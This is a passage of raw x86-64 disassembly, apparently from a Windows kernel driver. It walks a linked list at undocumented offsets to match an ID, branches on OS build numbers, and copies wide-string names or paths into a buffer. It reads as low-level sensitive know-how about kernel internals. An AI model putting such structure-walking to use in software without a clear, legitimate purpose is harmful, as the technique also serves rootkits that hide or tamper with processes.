   1400025b0:	c3                   	ret
   1400025b1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400025b5:	33 c0                	xor    %eax,%eax
   1400025b7:	48 8d 56 04          	lea    0x4(%rsi),%rdx
   1400025bb:	48 8b fa             	mov    %rdx,%rdi
   1400025be:	f2 ae                	repnz scas (%rdi),%al
   1400025c0:	48 f7 d1             	not    %rcx
   1400025c3:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400025c7:	77 d3                	ja     0x14000259c
   1400025c9:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400025cd:	48 2b ca             	sub    %rdx,%rcx
   1400025d0:	49 03 c8             	add    %r8,%rcx
   1400025d3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400025da:	84 00 00 00 00 00 
   1400025e0:	0f b6 02             	movzbl (%rdx),%eax
   1400025e3:	48 ff c2             	inc    %rdx
   1400025e6:	88 44 11 ff          	mov    %al,-0x1(%rcx,%rdx,1)
   1400025ea:	84 c0                	test   %al,%al
   1400025ec:	75 f2                	jne    0x1400025e0
   1400025ee:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400025f3:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400025f8:	33 c0                	xor    %eax,%eax
   1400025fa:	48 83 c4 40          	add    $0x40,%rsp
   1400025fe:	5f                   	pop    %rdi
   1400025ff:	c3                   	ret
   140002600:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002605:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000260a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000260f:	57                   	push   %rdi
   140002610:	48 83 ec 40          	sub    $0x40,%rsp
   140002614:	33 c0                	xor    %eax,%eax
   140002616:	8b f1                	mov    %ecx,%esi
   140002618:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000261d:	48 8b ea             	mov    %rdx,%rbp
   140002620:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140002624:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002628:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000262c:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140002630:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002634:	e8 a7 fa ff ff       	call   0x1400020e0
   140002639:	85 c0                	test   %eax,%eax
   14000263b:	78 38                	js     0x140002675
   14000263d:	8b 5c 24 24          	mov    0x24(%rsp),%ebx
   140002641:	ff 15 99 2a 00 00    	call   *0x2a99(%rip)        # 0x1400050e0
   140002647:	48 03 c3             	add    %rbx,%rax
   14000264a:	48 8b f8             	mov    %rax,%rdi
   14000264d:	48 39 40 08          	cmp    %rax,0x8(%rax)
   140002651:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002655:	74 1e                	je     0x140002675
   140002657:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000265b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002660:	48 2b fb             	sub    %rbx,%rdi
   140002663:	39 34 3a             	cmp    %esi,(%rdx,%rdi,1)
   140002666:	74 27                	je     0x14000268f
   140002668:	48 8b 39             	mov    (%rcx),%rdi
   14000266b:	48 39 47 08          	cmp    %rax,0x8(%rdi)
   14000266f:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140002673:	75 eb                	jne    0x140002660
   140002675:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000267a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000267f:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002684:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140002689:	48 83 c4 40          	add    $0x40,%rsp
   14000268d:	5f                   	pop    %rdi
   14000268e:	c3                   	ret
   14000268f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140002693:	48 8b 3c 38          	mov    (%rax,%rdi,1),%rdi
   140002697:	48 8b cf             	mov    %rdi,%rcx
   14000269a:	ff 15 c8 29 00 00    	call   *0x29c8(%rip)        # 0x140005068
   1400026a0:	84 c0                	test   %al,%al
   1400026a2:	74 d1                	je     0x140002675
   1400026a4:	66 83 3f 00          	cmpw   $0x0,(%rdi)
   1400026a8:	74 cb                	je     0x140002675
   1400026aa:	66 83 7f 02 00       	cmpw   $0x0,0x2(%rdi)
   1400026af:	74 c4                	je     0x140002675
   1400026b1:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400026b5:	ff 15 ad 29 00 00    	call   *0x29ad(%rip)        # 0x140005068
   1400026bb:	84 c0                	test   %al,%al
   1400026bd:	74 b6                	je     0x140002675
   1400026bf:	0f b7 07             	movzwl (%rdi),%eax
   1400026c2:	83 c0 02             	add    $0x2,%eax
   1400026c5:	3d 10 04 00 00       	cmp    $0x410,%eax
   1400026ca:	77 a9                	ja     0x140002675
   1400026cc:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   1400026d0:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400026d4:	33 c0                	xor    %eax,%eax
   1400026d6:	48 8b fa             	mov    %rdx,%rdi
   1400026d9:	66 f2 af             	repnz scas (%rdi),%ax
   1400026dc:	48 f7 d1             	not    %rcx
   1400026df:	48 03 c9             	add    %rcx,%rcx
   1400026e2:	48 81 f9 10 04 00 00 	cmp    $0x410,%rcx
   1400026e9:	77 8a                	ja     0x140002675
   1400026eb:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   1400026f2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400026f9:	1f 84 00 00 00 00 00 
   140002700:	0f b7 02             	movzwl (%rdx),%eax
   140002703:	48 83 c1 02          	add    $0x2,%rcx
   140002707:	48 83 c2 02          	add    $0x2,%rdx
   14000270b:	66 89 41 fe          	mov    %ax,-0x2(%rcx)
   14000270f:	66 85 c0             	test   %ax,%ax
   140002712:	75 ec                	jne    0x140002700
   140002714:	33 c0                	xor    %eax,%eax
   140002716:	e9 5f ff ff ff       	jmp    0x14000267a
   14000271b:	cc                   	int3
   14000271c:	cc                   	int3
   14000271d:	cc                   	int3
   14000271e:	cc                   	int3
   14000271f:	cc                   	int3
   140002720:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002725:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000272a:	57                   	push   %rdi
   14000272b:	48 83 ec 40          	sub    $0x40,%rsp
   14000272f:	33 c0                	xor    %eax,%eax
   140002731:	48 8b f1             	mov    %rcx,%rsi
   140002734:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002739:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000273d:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002741:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002745:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140002749:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000274d:	e8 8e f9 ff ff       	call   0x1400020e0
   140002752:	85 c0                	test   %eax,%eax
   140002754:	78 37                	js     0x14000278d
   140002756:	8b 1e                	mov    (%rsi),%ebx
   140002758:	8b 7c 24 24          	mov    0x24(%rsp),%edi
   14000275c:	ff 15 7e 29 00 00    	call   *0x297e(%rip)        # 0x1400050e0
   140002762:	48 03 c7             	add    %rdi,%rax
   140002765:	48 8b c8             	mov    %rax,%rcx
   140002768:	48 39 40 08          	cmp    %rax,0x8(%rax)
   14000276c:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140002770:	74 1b                	je     0x14000278d
   140002772:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   140002777:	48 2b cf             	sub    %rdi,%rcx
   14000277a:	41 39 1c 08          	cmp    %ebx,(%r8,%rcx,1)
   14000277e:	74 22                	je     0x1400027a2
   140002780:	48 8b 0a             	mov    (%rdx),%rcx
   140002783:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   140002787:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000278b:	75 ea                	jne    0x140002777
   14000278d:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140002792:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002797:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000279c:	48 83 c4 40          	add    $0x40,%rsp
   1400027a0:	5f                   	pop    %rdi
   1400027a1:	c3                   	ret
   1400027a2:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1400027a6:	48 8b 1c 08          	mov    (%rax,%rcx,1),%rbx
   1400027aa:	48 8b cb             	mov    %rbx,%rcx
   1400027ad:	ff 15 b5 28 00 00    	call   *0x28b5(%rip)        # 0x140005068
   1400027b3:	84 c0                	test   %al,%al
   1400027b5:	74 d6                	je     0x14000278d
   1400027b7:	66 83 3b 00          	cmpw   $0x0,(%rbx)
   1400027bb:	74 d0                	je     0x14000278d
   1400027bd:	66 83 7b 02 00       	cmpw   $0x0,0x2(%rbx)
   1400027c2:	74 c9                	je     0x14000278d
   1400027c4:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400027c8:	ff 15 9a 28 00 00    	call   *0x289a(%rip)        # 0x140005068
   1400027ce:	84 c0                	test   %al,%al
   1400027d0:	74 bb                	je     0x14000278d
   1400027d2:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400027d6:	33 c0                	xor    %eax,%eax
   1400027d8:	48 8d be 08 01 00 00 	lea    0x108(%rsi),%rdi
   1400027df:	66 f2 af             	repnz scas (%rdi),%ax
   1400027e2:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   1400027e6:	48 f7 d1             	not    %rcx
   1400027e9:	48 03 c9             	add    %rcx,%rcx
   1400027ec:	48 3b c8             	cmp    %rax,%rcx
   1400027ef:	77 9c                	ja     0x14000278d
   1400027f1:	4c 8b 43 08          	mov    0x8(%rbx),%r8
   1400027f5:	48 8d 96 08 01 00 00 	lea    0x108(%rsi),%rdx
   1400027fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002800:	0f b7 02             	movzwl (%rdx),%eax
   140002803:	49 83 c0 02          	add    $0x2,%r8
   140002807:	48 83 c2 02          	add    $0x2,%rdx
   14000280b:	66 41 89 40 fe       	mov    %ax,-0x2(%r8)
   140002810:	66 85 c0             	test   %ax,%ax
   140002813:	75 eb                	jne    0x140002800
   140002815:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140002819:	48 8d be 08 01 00 00 	lea    0x108(%rsi),%rdi
   140002820:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140002825:	33 c0                	xor    %eax,%eax
   140002827:	66 f2 af             	repnz scas (%rdi),%ax
   14000282a:	48 f7 d1             	not    %rcx
   14000282d:	48 ff c9             	dec    %rcx
   140002830:	66 03 c9             	add    %cx,%cx
   140002833:	66 89 0b             	mov    %cx,(%rbx)
   140002836:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000283b:	48 83 c4 40          	add    $0x40,%rsp
   14000283f:	5f                   	pop    %rdi
   140002840:	c3                   	ret
   140002841:	cc                   	int3
   140002842:	cc                   	int3
   140002843:	cc                   	int3
   140002844:	cc                   	int3
   140002845:	cc                   	int3
   140002846:	cc                   	int3
   140002847:	cc                   	int3
   140002848:	cc                   	int3
   140002849:	cc                   	int3
   14000284a:	cc                   	int3
   14000284b:	cc                   	int3
   14000284c:	cc                   	int3
   14000284d:	cc                   	int3
   14000284e:	cc                   	int3
   14000284f:	cc                   	int3
   140002850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002855:	55                   	push   %rbp
   140002856:	56                   	push   %rsi
   140002857:	57                   	push   %rdi
   140002858:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   14000285f:	33 c0                	xor    %eax,%eax
   140002861:	8b f1                	mov    %ecx,%esi
   140002863:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002868:	48 8b ea             	mov    %rdx,%rbp
   14000286b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000286f:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002873:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002877:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000287b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000287f:	e8 5c f8 ff ff       	call   0x1400020e0
   140002884:	85 c0                	test   %eax,%eax
   140002886:	78 33                	js     0x1400028bb
   140002888:	8b 5c 24 24          	mov    0x24(%rsp),%ebx
   14000288c:	ff 15 4e 28 00 00    	call   *0x284e(%rip)        # 0x1400050e0
   140002892:	48 03 c3             	add    %rbx,%rax
   140002895:	48 8b f8             	mov    %rax,%rdi
   140002898:	48 39 40 08          	cmp    %rax,0x8(%rax)
   14000289c:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400028a0:	74 19                	je     0x1400028bb
   1400028a2:	8b 54 24 20          	mov    0x20(%rsp),%edx
   1400028a6:	48 2b fb             	sub    %rbx,%rdi
   1400028a9:	39 34 3a             	cmp    %esi,(%rdx,%rdi,1)
   1400028ac:	74 25                	je     0x1400028d3
   1400028ae:	48 8b 39             	mov    (%rcx),%rdi
   1400028b1:	48 39 47 08          	cmp    %rax,0x8(%rdi)
   1400028b5:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   1400028b9:	75 eb                	jne    0x1400028a6
   1400028bb:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400028c0:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   1400028c7:	00 
   1400028c8:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   1400028cf:	5f                   	pop    %rdi
   1400028d0:	5e                   	pop    %rsi
   1400028d1:	5d                   	pop    %rbp
   1400028d2:	c3                   	ret
   1400028d3:	33 c0                	xor    %eax,%eax
   1400028d5:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   1400028da:	33 db                	xor    %ebx,%ebx
   1400028dc:	33 d2                	xor    %edx,%edx
   1400028de:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   1400028e4:	be 01 00 00 c0       	mov    $0xc0000001,%esi
   1400028e9:	66 89 5c 24 20       	mov    %bx,0x20(%rsp)
   1400028ee:	48 89 44 24 22       	mov    %rax,0x22(%rsp)
   1400028f3:	89 44 24 2a          	mov    %eax,0x2a(%rsp)
   1400028f7:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   1400028fc:	c7 44 24 40 1c 01 00 	movl   $0x11c,0x40(%rsp)
   140002903:	00 
   140002904:	e8 27 25 00 00       	call   0x140004e30
   140002909:	48 8d 15 00 2f 00 00 	lea    0x2f00(%rip),%rdx        # 0x140005810
   140002910:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002915:	ff 15 e5 26 00 00    	call   *0x26e5(%rip)        # 0x140005000
   14000291b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002920:	ff 15 82 28 00 00    	call   *0x2882(%rip)        # 0x1400051a8
   140002926:	48 85 c0             	test   %rax,%rax
   140002929:	0f 84 b0 00 00 00    	je     0x1400029df
   14000292f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002934:	ff d0                	call   *%rax
   140002936:	8b f0                	mov    %eax,%esi
   140002938:	85 c0                	test   %eax,%eax
   14000293a:	0f 88 bf 00 00 00    	js     0x1400029ff
   140002940:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140002944:	48 89 9c 24 98 01 00 	mov    %rbx,0x198(%rsp)
   14000294b:	00 
   14000294c:	3d 28 0a 00 00       	cmp    $0xa28,%eax
   140002951:	0f 84 49 01 00 00    	je     0x140002aa0
   140002957:	3d ce 0e 00 00       	cmp    $0xece,%eax
   14000295c:	0f 85 a4 00 00 00    	jne    0x140002a06
   140002962:	83 7c 24 44 05       	cmpl   $0x5,0x44(%rsp)
   140002967:	0f 85 33 01 00 00    	jne    0x140002aa0
   14000296d:	83 7c 24 48 02       	cmpl   $0x2,0x48(%rsp)
   140002972:	0f 85 28 01 00 00    	jne    0x140002aa0
   140002978:	48 8b bf f0 01 00 00 	mov    0x1f0(%rdi),%rdi
   14000297f:	48 8b cf             	mov    %rdi,%rcx
   140002982:	ff 15 e0 26 00 00    	call   *0x26e0(%rip)        # 0x140005068
   140002988:	84 c0                	test   %al,%al
   14000298a:	0f 84 2b ff ff ff    	je     0x1400028bb
   140002990:	48 8b 7f 28          	mov    0x28(%rdi),%rdi
   140002994:	48 8b cf             	mov    %rdi,%rcx
   140002997:	ff 15 cb 26 00 00    	call   *0x26cb(%rip)        # 0x140005068
   14000299d:	84 c0                	test   %al,%al
   14000299f:	0f 84 16 ff ff ff    	je     0x1400028bb
   1400029a5:	48 8b 0f             	mov    (%rdi),%rcx
   1400029a8:	ff 15 ba 26 00 00    	call   *0x26ba(%rip)        # 0x140005068
   1400029ae:	84 c0                	test   %al,%al
   1400029b0:	0f 84 05 ff ff ff    	je     0x1400028bb
   1400029b6:	48 8b 0f             	mov    (%rdi),%rcx
   1400029b9:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400029bd:	ff 15 a5 26 00 00    	call   *0x26a5(%rip)        # 0x140005068
   1400029c3:	84 c0                	test   %al,%al
   1400029c5:	0f 84 f0 fe ff ff    	je     0x1400028bb
   1400029cb:	48 8b 07             	mov    (%rdi),%rax
   1400029ce:	48 8b 58 30          	mov    0x30(%rax),%rbx
   1400029d2:	48 89 9c 24 98 01 00 	mov    %rbx,0x198(%rsp)
   1400029d9:	00 
   1400029da:	e9 c1 00 00 00       	jmp    0x140002aa0
   1400029df:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   1400029e4:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1400029e9:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   1400029ee:	45 33 c9             	xor    %r9d,%r9d
   1400029f1:	ff 15 b9 27 00 00    	call   *0x27b9(%rip)        # 0x1400051b0
   1400029f7:	84 c0                	test   %al,%al
   1400029f9:	0f 85 41 ff ff ff    	jne    0x140002940
   1400029ff:	8b c6                	mov    %esi,%eax
   140002a01:	e9 ba fe ff ff       	jmp    0x1400028c0
   140002a06:	3d 70 17 00 00       	cmp    $0x1770,%eax
   140002a0b:	0f 82 8f 00 00 00    	jb     0x140002aa0
   140002a11:	83 7c 24 44 06       	cmpl   $0x6,0x44(%rsp)
   140002a16:	0f 82 84 00 00 00    	jb     0x140002aa0
   140002a1c:	48 8d 94 24 90 01 00 	lea    0x190(%rsp),%rdx
   140002a23:	00 
   140002a24:	48 8d 0d 3d 29 00 00 	lea    0x293d(%rip),%rcx        # 0x140005368
   140002a2b:	e8 00 f5 ff ff       	call   0x140001f30
   140002a30:	48 85 c0             	test   %rax,%rax
   140002a33:	75 36                	jne    0x140002a6b
   140002a35:	48 8d 94 24 90 01 00 	lea    0x190(%rsp),%rdx
   140002a3c:	00 
   140002a3d:	48 8d 0d 34 29 00 00 	lea    0x2934(%rip),%rcx        # 0x140005378
   140002a44:	e8 e7 f4 ff ff       	call   0x140001f30
   140002a49:	48 85 c0             	test   %rax,%rax
   140002a4c:	75 1d                	jne    0x140002a6b
   140002a4e:	48 8d 94 24 90 01 00 	lea    0x190(%rsp),%rdx
   140002a55:	00 
   140002a56:	48 8d 0d 2b 29 00 00 	lea    0x292b(%rip),%rcx        # 0x140005388
   140002a5d:	e8 ce f4 ff ff       	call   0x140001f30
   140002a62:	48 85 c0             	test   %rax,%rax
   140002a65:	0f 84 50 fe ff ff    	je     0x1400028bb
   140002a6b:	48 8d 15 26 29 00 00 	lea    0x2926(%rip),%rdx        # 0x140005398
   140002a72:	48 8b c8             	mov    %rax,%rcx
   140002a75:	e8 b6 f5 ff ff       	call   0x140002030
   140002a7a:	48 85 c0             	test   %rax,%rax
   140002a7d:	0f 84 38 fe ff ff    	je     0x1400028bb
   140002a83:	48 8d 94 24 98 01 00 	lea    0x198(%rsp),%rdx
   140002a8a:	00 
   140002a8b:	48 8b cf             	mov    %rdi,%rcx
   140002a8e:	ff d0                	call   *%rax
   140002a90:	85 c0                	test   %eax,%eax
   140002a92:	0f 88 23 fe ff ff    	js     0x1400028bb
   140002a98:	48 8b 9c 24 98 01 00 	mov    0x198(%rsp),%rbx
   140002a9f:	00 
   140002aa0:	48 8b cb             	mov    %rbx,%rcx
   140002aa3:	ff 15 bf 25 00 00    	call   *0x25bf(%rip)        # 0x140005068
   140002aa9:	84 c0                	test   %al,%al
   140002aab:	0f 84 0a fe ff ff    	je     0x1400028bb
   140002ab1:	48 8b 8c 24 98 01 00 	mov    0x198(%rsp),%rcx
   140002ab8:	00 
   140002ab9:	66 83 79 58 00       	cmpw   $0x0,0x58(%rcx)
   140002abe:	0f 84 f7 fd ff ff    	je     0x1400028bb
   140002ac4:	66 83 79 5a 00       	cmpw   $0x0,0x5a(%rcx)
   140002ac9:	0f 84 ec fd ff ff    	je     0x1400028bb
   140002acf:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   140002ad3:	ff 15 8f 25 00 00    	call   *0x258f(%rip)        # 0x140005068
   140002ad9:	84 c0                	test   %al,%al
   140002adb:	0f 84 da fd ff ff    	je     0x1400028bb
   140002ae1:	48 8b 94 24 98 01 00 	mov    0x198(%rsp),%rdx
   140002ae8:	00 
   140002ae9:	0f b7 42 58          	movzwl 0x58(%rdx),%eax
   140002aed:	83 c0 02             	add    $0x2,%eax
   140002af0:	3d 08 02 00 00       	cmp    $0x208,%eax
   140002af5:	0f 87 c0 fd ff ff    	ja     0x1400028bb
   140002afb:	48 8b 52 60          	mov    0x60(%rdx),%rdx
   140002aff:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140002b03:	33 c0                	xor    %eax,%eax
   140002b05:	48 8b fa             	mov    %rdx,%rdi
   140002b08:	66 f2 af             	repnz scas (%rdi),%ax
   140002b0b:	48 f7 d1             	not    %rcx
   140002b0e:	48 03 c9             	add    %rcx,%rcx
   140002b11:	48 81 f9 08 02 00 00 	cmp    $0x208,%rcx
   140002b18:	0f 87 9d fd ff ff    	ja     0x1400028bb
   140002b1e:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140002b25:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140002b2c:	00 00 00 00 
   140002b30:	0f b7 02             	movzwl (%rdx),%eax
   140002b33:	48 83 c1 02          	add    $0x2,%rcx
   140002b37:	48 83 c2 02          	add    $0x2,%rdx
   140002b3b:	66 89 41 fe          	mov    %ax,-0x2(%rcx)
   140002b3f:	66 85 c0             	test   %ax,%ax
   140002b42:	75 ec                	jne    0x140002b30
   140002b44:	33 c0                	xor    %eax,%eax
   140002b46:	e9 75 fd ff ff       	jmp    0x1400028c0
   140002b4b:	cc                   	int3
   140002b4c:	cc                   	int3
   140002b4d:	cc                   	int3
   140002b4e:	cc                   	int3
   140002b4f:	cc                   	int3
   140002b50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b55:	55                   	push   %rbp
   140002b56:	56                   	push   %rsi
   140002b57:	57                   	push   %rdi
   140002b58:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140002b5f:	33 c0                	xor    %eax,%eax
   140002b61:	48 8b e9             	mov    %rcx,%rbp
   140002b64:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002b69:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140002b6d:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002b71:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002b75:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140002b79:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002b7d:	e8 5e f5 ff ff       	call   0x1400020e0
   140002b82:	85 c0                	test   %eax,%eax
   140002b84:	78 36                	js     0x140002bbc
   140002b86:	8b 75 00             	mov    0x0(%rbp),%esi
   140002b89:	8b 5c 24 24          	mov    0x24(%rsp),%ebx
   140002b8d:	ff 15 4d 25 00 00    	call   *0x254d(%rip)        # 0x1400050e0
   140002b93:	48 03 c3             	add    %rbx,%rax
   140002b96:	48 8b f8             	mov    %rax,%rdi
   140002b99:	48 39 40 08          	cmp    %rax,0x8(%rax)
   140002b9d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002ba1:	74 19                	je     0x140002bbc
   140002ba3:	8b 54 24 20          	mov    0x20(%rsp),%edx
   140002ba7:	48 2b fb             	sub    %rbx,%rdi
   140002baa:	39 34 3a             	cmp    %esi,(%rdx,%rdi,1)
   140002bad:	74 25                	je     0x140002bd4
   140002baf:	48 8b 39             	mov    (%rcx),%rdi
   140002bb2:	48 39 47 08          	cmp    %rax,0x8(%rdi)
   140002bb6:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140002bba:	75 eb                	jne    0x140002ba7
   140002bbc:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140002bc1:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   140002bc8:	00 
   140002bc9:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   140002bd0:	5f                   	pop    %rdi
   140002bd1:	5e                   	pop    %rsi
   140002bd2:	5d                   	pop    %rbp
   140002bd3:	c3                   	ret
   140002bd4:	33 c0                	xor    %eax,%eax
   140002bd6:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   140002bdb:	33 db                	xor    %ebx,%ebx
   140002bdd:	33 d2                	xor    %edx,%edx
   140002bdf:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   140002be5:	be 01 00 00 c0       	mov    $0xc0000001,%esi
   140002bea:	66 89 5c 24 20       	mov    %bx,0x20(%rsp)
   140002bef:	48 89 44 24 22       	mov    %rax,0x22(%rsp)
   140002bf4:	89 44 24 2a          	mov    %eax,0x2a(%rsp)
   140002bf8:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   140002bfd:	c7 44 24 40 1c 01 00 	movl   $0x11c,0x40(%rsp)
   140002c04:	00 
   140002c05:	e8 26 22 00 00       	call   0x140004e30
   140002c0a:	48 8d 15 ff 2b 00 00 	lea    0x2bff(%rip),%rdx        # 0x140005810
   140002c11:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c16:	ff 15 e4 23 00 00    	call   *0x23e4(%rip)        # 0x140005000
   140002c1c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c21:	ff 15 81 25 00 00    	call   *0x2581(%rip)        # 0x1400051a8
   140002c27:	48 85 c0             	test   %rax,%rax
   140002c2a:	0f 84 b0 00 00 00    	je     0x140002ce0
   140002c30:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002c35:	ff d0                	call   *%rax
   140002c37:	8b f0                	mov    %eax,%esi
   140002c39:	85 c0                	test   %eax,%eax
   140002c3b:	0f 88 bf 00 00 00    	js     0x140002d00
   140002c41:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140002c45:	48 89 9c 24 90 01 00 	mov    %rbx,0x190(%rsp)
   140002c4c:	00 
   140002c4d:	3d 28 0a 00 00       	cmp    $0xa28,%eax
   140002c52:	0f 84 49 01 00 00    	je     0x140002da1
   140002c58:	3d ce 0e 00 00       	cmp    $0xece,%eax
   140002c5d:	0f 85 a4 00 00 00    	jne    0x140002d07
   140002c63:	83 7c 24 44 05       	cmpl   $0x5,0x44(%rsp)
   140002c68:	0f 85 33 01 00 00    	jne    0x140002da1
   140002c6e:	83 7c 24 48 02       	cmpl   $0x2,0x48(%rsp)
   140002c73:	0f 85 28 01 00 00    	jne    0x140002da1
   140002c79:	48 8b bf f0 01 00 00 	mov    0x1f0(%rdi),%rdi
   140002c80:	48 8b cf             	mov    %rdi,%rcx
   140002c83:	ff 15 df 23 00 00    	call   *0x23df(%rip)        # 0x140005068
   140002c89:	84 c0                	test   %al,%al
   140002c8b:	0f 84 2b ff ff ff    	je     0x140002bbc
   140002c91:	48 8b 7f 28          	mov    0x28(%rdi),%rdi
   140002c95:	48 8b cf             	mov    %rdi,%rcx
   140002c98:	ff 15 ca 23 00 00    	call   *0x23ca(%rip)        # 0x140005068
   140002c9e:	84 c0                	test   %al,%al
   140002ca0:	0f 84 16 ff ff ff    	je     0x140002bbc
   140002ca6:	48 8b 0f             	mov    (%rdi),%rcx
   140002ca9:	ff 15 b9 23 00 00    	call   *0x23b9(%rip)        # 0x140005068
   140002caf:	84 c0                	test   %al,%al
   140002cb1:	0f 84 05 ff ff ff    	je     0x140002bbc
   140002cb7:	48 8b 0f             	mov    (%rdi),%rcx
   140002cba:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   140002cbe:	ff 15 a4 23 00 00    	call   *0x23a4(%rip)        # 0x140005068
   140002cc4:	84 c0                	test   %al,%al
   140002cc6:	0f 84 f0 fe ff ff    	je     0x140002bbc
   140002ccc:	48 8b 07             	mov    (%rdi),%rax
   140002ccf:	48 8b 58 30          	mov    0x30(%rax),%rbx
   140002cd3:	48 89 9c 24 90 01 00 	mov    %rbx,0x190(%rsp)
   140002cda:	00 
   140002cdb:	e9 c1 00 00 00       	jmp    0x140002da1
   140002ce0:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   140002ce5:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140002cea:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   140002cef:	45 33 c9             	xor    %r9d,%r9d
   140002cf2:	ff 15 b8 24 00 00    	call   *0x24b8(%rip)        # 0x1400051b0
   140002cf8:	84 c0                	test   %al,%al
   140002cfa:	0f 85 41 ff ff ff    	jne    0x140002c41
   140002d00:	8b c6                	mov    %esi,%eax
   140002d02:	e9 ba fe ff ff       	jmp    0x140002bc1
